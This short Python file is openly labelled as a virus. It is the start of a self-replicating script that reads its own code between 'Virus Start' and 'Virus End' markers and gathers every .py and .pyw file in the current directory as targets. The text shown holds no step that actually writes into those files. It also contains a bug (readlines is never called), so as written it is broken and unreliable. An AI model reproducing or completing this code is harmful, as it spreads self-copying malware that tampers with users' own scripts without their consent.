# Virus Start

import sys, glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines

virus_area = False
for line in lines:
    if line == '# Virus Start\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == "# Virus End\n":
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

# Virus End